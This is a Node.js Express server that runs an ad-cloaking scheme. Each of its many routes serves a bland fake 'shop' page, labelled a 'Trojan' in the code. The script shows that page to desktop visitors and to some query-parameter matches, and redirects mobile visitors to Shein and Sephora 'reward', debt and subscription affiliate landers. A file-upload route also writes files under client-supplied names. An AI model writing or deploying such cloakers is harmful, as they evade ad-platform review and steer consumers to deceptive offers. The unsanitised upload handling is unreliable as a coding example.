const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const xlsx = require('xlsx');

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to pass on Tyler's SubIDs MY LANDER
app.get('/twshein/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://tok-reward.com/twshein.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twshein Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's Debt lander
app.get('/jgw/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = 'https://advantageoasis.com/a7c2c0d53b94dfc6b117bf25c373b152d/?sid1=&sid2=&sid3=&sid4='
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twshein Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs SHEIN IMAGE LANDER
app.get('/twsheinimg/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://tok-reward.com/twsheinimg.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twsheinimg Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs DIRECT TO MRR 
app.get('/twsheindir/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://sctrk.visit-24.com/4e06a3f4-32c3-5494-8c49-e059ad90b17e/?transaction_id=#clickid#&offer_id=#oid#&aff_id=#affid#&aff_sub=#traffic_source#&msisdn={mobile}&email={email}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twsheindir Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs SEPHORA
app.get('/twsephora/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://tok-reward.com/twsephora.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twsheindir Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs SEPHORA IMAGE
app.get('/twsephoraimg/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://tok-reward.com/twsephorauk.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twsheindir Trojan (tyler)(${slug})`);
});

// Middleware to pass on Tyler's SubIDs MY LANDER
app.get('/twsheinuk/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://tok-reward.com/twsheinuk.html?sub=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served twshein Trojan (tyler)(${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SHEIN US CAMP)
app.get('/shein/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/1cc3f21b-9970-4cf1-98d6-2105066f060d?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to the ${slug} Store!</h1>
            <p>You are browsing ${slug}'s Web Shop.</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SHEIN CA CAMP)
app.get('/sheinca/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/90f05b7d-bdb1-4d1d-9a24-46227673017c?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SHEIN AU CAMP)
app.get('/sheinuk/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/8584e0ec-eef7-4bd2-b0c3-f61d8cf8cf73?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to the new ${slug} Store!</h1>
            <p>We hope you enjoy ${slug}'s best products.</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SHEIN AU CAMP)
app.get('/sheinau/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/a967a674-626e-404d-8b17-96c3a7dcdcd2?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to the new ${slug} Store!</h1>
            <p>We hope you enjoy ${slug}'s best products.</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
});

// Middleware to pass on my slug values to MaxConv (SEPHORA CAMP)
app.get('/sephora/:slug', (req, res, next) => {
    const { slug } = req.params;
    const destinationLander = `https://klcxb6.mcgo2.com/visit/d198df7c-4379-4818-9f7c-ea8e2a34cf6a?slug=${slug}`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to ${slug} Shop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
});

// Middleware to handle requests to /:offer/:slug
app.get('/:offer/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `https://tok-reward.com/${offer}.html`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to the ${slug} WebShop!</h1>
            <p>You are shopping at: ${slug}</p>
        </body>
        </html>
            `;
            res.send(trojanHTML);
            console.log(`Served ${offer} Trojan (${slug})`);
});

// IMPORT/EXPORT App

// Set up multer for handling file uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/');
  },
  filename: function (req, file, cb) {
    cb(null, file.originalname);
  }
});
const upload = multer({ storage: storage });

// Route for handling file uploads
app.post('/upload', upload.single('uploadedFile'), (req, res) => {
  // Read the uploaded file
  const workbook = xlsx.readFile(req.file.path);
  const sheetName = workbook.SheetNames[0];
  const worksheet = workbook.Sheets[sheetName];

  // Modify the data in the worksheet as needed
  // For example, changing cell A1 to 'Hello World'
  worksheet.A1.v = 'Hello World';

  // Write the modified workbook to a new file
  const outputPath = `modified_${req.file.originalname}`;
  xlsx.writeFile(workbook, outputPath);

  // Send the modified file as a response
  res.download(outputPath, (err) => {
    // Delete the modified file after it has been sent
    fs.unlink(outputPath, (err) => {
      if (err) {
        console.error('Error deleting file:', err);
      }
    });
  });
});

// Start the HTTP server
const PORT = 8080;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

